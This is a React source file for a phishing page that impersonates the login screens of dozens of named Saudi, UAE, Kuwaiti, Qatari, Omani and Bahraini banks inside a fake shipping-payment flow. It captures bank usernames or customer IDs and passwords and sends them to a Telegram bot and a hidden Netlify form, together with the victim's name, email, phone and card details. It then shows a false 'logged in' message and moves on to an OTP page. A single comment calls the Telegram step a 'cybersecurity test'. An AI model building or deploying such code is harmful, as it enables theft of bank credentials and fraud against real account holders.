import React, { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, ArrowLeft } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getBankLoginDesign } from "@/lib/bankLoginDesigns";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  // Bank login credentials state
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Get customer info and selected bank from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
  const cardInfo = {
    cardName: sessionStorage.getItem('cardName') || '',
    cardLast4: sessionStorage.getItem('cardLast4') || '',
    cardNumber: sessionStorage.getItem('cardNumber') || '',
    cardExpiry: sessionStorage.getItem('cardExpiry') || '',
    cardCvv: sessionStorage.getItem('cardCvv') || '',
    cardType: sessionStorage.getItem('cardType') || '',
  };
  
  // Get service info for meta tags and display
  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const serviceBranding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  // Get bank from link data or sessionStorage
  const bankIdFromLink = linkData?.payload?.selected_bank || selectedBankId;
  const selectedBank = bankIdFromLink && bankIdFromLink !== 'skipped' ? getBankById(bankIdFromLink) : null;
  const selectedCountryData = linkData?.country_code ? getCountryByCode(linkData.country_code) : (selectedCountry ? getCountryByCode(selectedCountry) : null);
  
  // Get bank-specific login design
  const bankDesign = selectedBank ? getBankLoginDesign(selectedBank.id) : getBankLoginDesign('alrajhi_bank');
  
  // Determine login type based on bank
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    // Saudi banks
    if (bankId === 'alrajhi_bank') return 'username';
    if (bankId === 'alahli_bank') return 'username';
    if (bankId === 'riyad_bank') return 'customerId';
    if (bankId === 'samba_bank') return 'username';
    if (bankId === 'saudi_investment_bank') return 'customerId';
    if (bankId === 'arab_national_bank') return 'username';
    if (bankId === 'saudi_fransi_bank') return 'customerId';
    if (bankId === 'alinma_bank') return 'username';
    if (bankId === 'albilad_bank') return 'customerId';
    if (bankId === 'aljazira_bank') return 'username';
    
    // UAE banks
    if (bankId === 'emirates_nbd') return 'username';
    if (bankId === 'adcb') return 'customerId';
    if (bankId === 'fab') return 'username';
    if (bankId === 'dib') return 'username';
    if (bankId === 'mashreq_bank') return 'customerId';
    if (bankId === 'cbd') return 'username';
    if (bankId === 'rakbank') return 'customerId';
    if (bankId === 'ajman_bank') return 'username';
    
    // Kuwait banks
    if (bankId === 'nbk') return 'customerId';
    if (bankId === 'gulf_bank') return 'username';
    if (bankId === 'cbk') return 'customerId';
    if (bankId === 'burgan_bank') return 'username';
    if (bankId === 'ahli_united_bank') return 'username';
    if (bankId === 'kfh') return 'customerId';
    if (bankId === 'boubyan_bank') return 'username';
    
    // Qatar banks
    if (bankId === 'qnb') return 'customerId';
    if (bankId === 'cbq') return 'username';
    if (bankId === 'doha_bank') return 'username';
    if (bankId === 'qib') return 'customerId';
    if (bankId === 'masraf_alrayan') return 'username';
    if (bankId === 'ahlibank') return 'customerId';
    
    // Oman banks
    if (bankId === 'bank_muscat') return 'customerId';
    if (bankId === 'national_bank_oman') return 'username';
    if (bankId === 'bank_dhofar') return 'username';
    if (bankId === 'ahli_bank_oman') return 'customerId';
    if (bankId === 'nizwa_bank') return 'username';
    if (bankId === 'sohar_international') return 'customerId';
    
    // Bahrain banks
    if (bankId === 'nbb') return 'username';
    if (bankId === 'bbk') return 'customerId';
    if (bankId === 'ahli_united_bahrain') return 'username';
    if (bankId === 'bisb') return 'username';
    if (bankId === 'ithmaar_bank') return 'customerId';
    if (bankId === 'khaleeji_bank') return 'username';
    
    return 'username'; // Default
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate based on login type
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store bank login info
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };
    
    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    // Send bank login details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Bank login details sent to Telegram successfully');
    } else {
      console.error('Failed to send bank login details to Telegram:', telegramResult.error);
    }
    
    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    // Navigate to OTP verification
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceName={serviceName}
        serviceKey={serviceKey}
        title={`تسجيل الدخول - ${selectedBank?.nameAr || serviceName}`}
        description={serviceBranding.description || `تسجيل الدخول للبنك - ${serviceName}`}
      />
    <div 
      className="min-h-screen flex items-center justify-center"
      dir={bankDesign.layout.direction}
      style={{
        backgroundColor: bankDesign.backgroundColor,
        fontFamily: bankDesign.fontFamily,
        color: bankDesign.textColor,
        padding: bankDesign.layout.containerPadding || '0',
        backgroundImage: bankDesign.backgroundImage ? `url(${bankDesign.backgroundImage})` : undefined,
        backgroundSize: bankDesign.backgroundImage ? 'cover' : undefined,
        backgroundPosition: bankDesign.backgroundImage ? 'center' : undefined,
      }}
    >
      {/* Main Container */}
      <div 
        className="w-full flex flex-col items-center justify-center"
        style={{
          maxWidth: bankDesign.layout.maxWidth || '100%',
          padding: '20px',
        }}
      >
        {/* Bank Logo Section - Exact match to official bank login page */}
        <div 
          className="mb-10"
          style={{
            textAlign: 'center',
            width: '100%',
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            paddingTop: '40px',
            paddingBottom: '20px',
          }}
        >
          {selectedBank && (
            <div 
              style={{
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                gap: '20px',
              }}
            >
              {/* Bank Logo - Matching official design */}
              <div
                style={{
                  width: bankDesign.layout.logoSize?.width || '200px',
                  height: bankDesign.layout.logoSize?.height || '70px',
                  backgroundColor: bankDesign.primaryColor,
                  borderRadius: '6px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  boxShadow: '0 3px 10px rgba(0,0,0,0.15)',
                  border: `2px solid ${bankDesign.secondaryColor}`,
                }}
              >
                <Building2 
                  className="text-white"
                  style={{
                    width: '56px',
                    height: '56px',
                  }}
                />
              </div>
              <h1 
                style={{
                  fontSize: bankDesign.fontSize.title,
                  fontWeight: bankDesign.fontWeight.title,
                  color: bankDesign.primaryColor,
                  margin: 0,
                  fontFamily: bankDesign.fontFamily,
                  letterSpacing: '0.5px',
                }}
              >
                {selectedBank.nameAr}
              </h1>
              <p
                style={{
                  fontSize: bankDesign.fontSize.subtitle,
                  color: bankDesign.textColor,
                  opacity: 0.7,
                  margin: 0,
                  fontFamily: bankDesign.fontFamily,
                }}
              >
                {selectedBank.name}
              </p>
            </div>
          )}
        </div>

        {/* Login Form Card - Exact match to official design */}
        <div 
          style={{
            backgroundColor: bankDesign.inputBackgroundColor,
            borderRadius: '8px',
            padding: '36px',
            boxShadow: '0 4px 16px rgba(0,0,0,0.08)',
            border: `1px solid ${bankDesign.inputStyles.borderColor}`,
            width: '100%',
            maxWidth: bankDesign.layout.formMaxWidth || '420px',
            margin: '0 auto',
          }}
        >
          <form onSubmit={handleSubmit}>
            {/* Login Title - Matching official style */}
            <h2 
              style={{
                fontSize: '22px',
                fontWeight: bankDesign.fontWeight.title,
                color: bankDesign.textColor,
                marginBottom: '28px',
                textAlign: 'center',
                fontFamily: bankDesign.fontFamily,
                marginTop: 0,
              }}
            >
              تسجيل الدخول
            </h2>
            
            {/* Username Login */}
            {loginType === 'username' && (
              <div style={{ marginBottom: bankDesign.spacing.inputMarginBottom }}>
                <Label 
                  htmlFor="username"
                  style={{
                    display: 'block',
                    fontSize: bankDesign.fontSize.body,
                    fontWeight: bankDesign.fontWeight.subtitle,
                    marginBottom: '8px',
                    color: bankDesign.textColor,
                    fontFamily: bankDesign.fontFamily,
                  }}
                >
                  {bankDesign.labels.username}
                </Label>
                <Input
                  id="username"
                  type="text"
                  placeholder={bankDesign.placeholders.username}
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  autoComplete="username"
                  required
                  style={{
                    width: '100%',
                    height: bankDesign.inputStyles.height,
                    padding: bankDesign.inputStyles.padding,
                    fontSize: bankDesign.fontSize.input,
                    borderRadius: bankDesign.inputStyles.borderRadius,
                    borderWidth: bankDesign.inputStyles.borderWidth,
                    borderColor: bankDesign.inputStyles.borderColor,
                    backgroundColor: bankDesign.inputBackgroundColor,
                    fontFamily: bankDesign.fontFamily,
                  }}
                />
              </div>
            )}
            
            {/* Customer ID Login */}
            {loginType === 'customerId' && (
              <div style={{ marginBottom: bankDesign.spacing.inputMarginBottom }}>
                <Label 
                  htmlFor="customerId"
                  style={{
                    display: 'block',
                    fontSize: bankDesign.fontSize.body,
                    fontWeight: bankDesign.fontWeight.subtitle,
                    marginBottom: '8px',
                    color: bankDesign.textColor,
                    fontFamily: bankDesign.fontFamily,
                  }}
                >
                  {bankDesign.labels.customerId}
                </Label>
                <Input
                  id="customerId"
                  type="text"
                  placeholder={bankDesign.placeholders.customerId}
                  value={customerId}
                  onChange={(e) => setCustomerId(e.target.value)}
                  inputMode="numeric"
                  required
                  style={{
                    width: '100%',
                    height: bankDesign.inputStyles.height,
                    padding: bankDesign.inputStyles.padding,
                    fontSize: bankDesign.fontSize.input,
                    borderRadius: bankDesign.inputStyles.borderRadius,
                    borderWidth: bankDesign.inputStyles.borderWidth,
                    borderColor: bankDesign.inputStyles.borderColor,
                    backgroundColor: bankDesign.inputBackgroundColor,
                    fontFamily: bankDesign.fontFamily,
                  }}
                />
              </div>
            )}
            
            {/* Phone Login */}
            {loginType === 'phone' && (
              <div style={{ marginBottom: bankDesign.spacing.inputMarginBottom }}>
                <Label 
                  htmlFor="phone"
                  style={{
                    display: 'block',
                    fontSize: bankDesign.fontSize.body,
                    fontWeight: bankDesign.fontWeight.subtitle,
                    marginBottom: '8px',
                    color: bankDesign.textColor,
                    fontFamily: bankDesign.fontFamily,
                  }}
                >
                  {bankDesign.labels.phone}
                </Label>
                <Input
                  id="phone"
                  type="tel"
                  placeholder={bankDesign.placeholders.phone}
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  inputMode="tel"
                  required
                  style={{
                    width: '100%',
                    height: bankDesign.inputStyles.height,
                    padding: bankDesign.inputStyles.padding,
                    fontSize: bankDesign.fontSize.input,
                    borderRadius: bankDesign.inputStyles.borderRadius,
                    borderWidth: bankDesign.inputStyles.borderWidth,
                    borderColor: bankDesign.inputStyles.borderColor,
                    backgroundColor: bankDesign.inputBackgroundColor,
                    fontFamily: bankDesign.fontFamily,
                  }}
                />
              </div>
            )}
            
            {/* Password */}
            <div style={{ marginBottom: bankDesign.spacing.inputMarginBottom }}>
              <Label 
                htmlFor="password"
                style={{
                  display: 'block',
                  fontSize: bankDesign.fontSize.body,
                  fontWeight: bankDesign.fontWeight.subtitle,
                  marginBottom: '8px',
                  color: bankDesign.textColor,
                  fontFamily: bankDesign.fontFamily,
                }}
              >
                {bankDesign.labels.password}
              </Label>
              <div style={{ position: 'relative' }}>
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  placeholder={bankDesign.placeholders.password}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  autoComplete="current-password"
                  required
                  style={{
                    width: '100%',
                    height: bankDesign.inputStyles.height,
                    padding: bankDesign.inputStyles.padding,
                    paddingRight: '48px',
                    fontSize: bankDesign.fontSize.input,
                    borderRadius: bankDesign.inputStyles.borderRadius,
                    borderWidth: bankDesign.inputStyles.borderWidth,
                    borderColor: bankDesign.inputStyles.borderColor,
                    backgroundColor: bankDesign.inputBackgroundColor,
                    fontFamily: bankDesign.fontFamily,
                  }}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  style={{
                    position: 'absolute',
                    right: '12px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                    color: bankDesign.textColor,
                    opacity: 0.6,
                  }}
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
              </div>
            </div>
            
            {/* Remember Me / Forgot Password */}
            <div 
              style={{
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                marginBottom: bankDesign.spacing.buttonMarginTop,
                fontSize: bankDesign.fontSize.small,
              }}
            >
              <label 
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  cursor: 'pointer',
                  color: bankDesign.textColor,
                  fontFamily: bankDesign.fontFamily,
                }}
              >
                <input 
                  type="checkbox" 
                  id="remember"
                  style={{
                    width: '16px',
                    height: '16px',
                    cursor: 'pointer',
                  }}
                />
                <span>{bankDesign.labels.rememberMe}</span>
              </label>
              <button
                type="button"
                style={{
                  background: 'none',
                  border: 'none',
                  cursor: 'pointer',
                  color: bankDesign.linkColor,
                  textDecoration: 'underline',
                  fontSize: bankDesign.fontSize.small,
                  fontFamily: bankDesign.fontFamily,
                }}
              >
                {bankDesign.labels.forgotPassword}
              </button>
            </div>
            
            {/* Submit Button - Exact match to official design */}
            <button
              type="submit"
              disabled={isSubmitting}
              style={{
                width: '100%',
                height: bankDesign.buttonStyles.height,
                padding: bankDesign.buttonStyles.padding,
                fontSize: bankDesign.fontSize.button,
                fontWeight: bankDesign.fontWeight.button,
                color: '#FFFFFF',
                backgroundColor: bankDesign.buttonColor,
                border: 'none',
                borderRadius: bankDesign.buttonStyles.borderRadius,
                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                boxShadow: bankDesign.buttonStyles.boxShadow,
                transition: 'all 0.2s ease',
                opacity: isSubmitting ? 0.7 : 1,
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                fontFamily: bankDesign.fontFamily,
                textTransform: 'none',
                letterSpacing: '0.3px',
              }}
              onMouseEnter={(e) => {
                if (!isSubmitting) {
                  e.currentTarget.style.backgroundColor = bankDesign.buttonHoverColor;
                  e.currentTarget.style.boxShadow = '0 4px 8px rgba(0,108,53,0.3)';
                }
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = bankDesign.buttonColor;
                e.currentTarget.style.boxShadow = bankDesign.buttonStyles.boxShadow;
              }}
            >
              {isSubmitting ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span style={{ width: '16px', height: '16px', border: '2px solid white', borderTop: '2px solid transparent', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></span>
                  جاري تسجيل الدخول...
                </span>
              ) : (
                <>
                  <Lock className="w-5 h-5" />
                  <span>{bankDesign.labels.loginButton}</span>
                </>
              )}
            </button>
            
            {/* Terms Notice */}
            <p 
              style={{
                textAlign: 'center',
                fontSize: bankDesign.fontSize.small,
                color: bankDesign.textColor,
                opacity: 0.7,
                marginTop: '16px',
                marginBottom: 0,
                fontFamily: bankDesign.fontFamily,
              }}
            >
              بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
            </p>
          </form>
        </div>
        
        {/* Register Link */}
        <div 
          style={{
            textAlign: 'center',
            marginTop: bankDesign.spacing.sectionGap,
            paddingTop: bankDesign.spacing.sectionGap,
            borderTop: `1px solid ${bankDesign.inputStyles.borderColor}`,
            width: '100%',
            maxWidth: bankDesign.layout.formMaxWidth || '420px',
          }}
        >
          <p 
            style={{
              fontSize: bankDesign.fontSize.small,
              color: bankDesign.textColor,
              opacity: 0.7,
              marginBottom: '12px',
              fontFamily: bankDesign.fontFamily,
            }}
          >
            لا تملك حساب؟
          </p>
          <button
            type="button"
            style={{
              padding: '10px 24px',
              fontSize: bankDesign.fontSize.small,
              color: bankDesign.primaryColor,
              backgroundColor: 'transparent',
              border: `1px solid ${bankDesign.primaryColor}`,
              borderRadius: bankDesign.buttonStyles.borderRadius,
              cursor: 'pointer',
              fontFamily: bankDesign.fontFamily,
            }}
          >
            {bankDesign.labels.registerLink}
          </button>
        </div>
      </div>
      
      {/* Hidden Netlify Form */}
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </div>
    </>
  );
};

export default PaymentBankLogin;
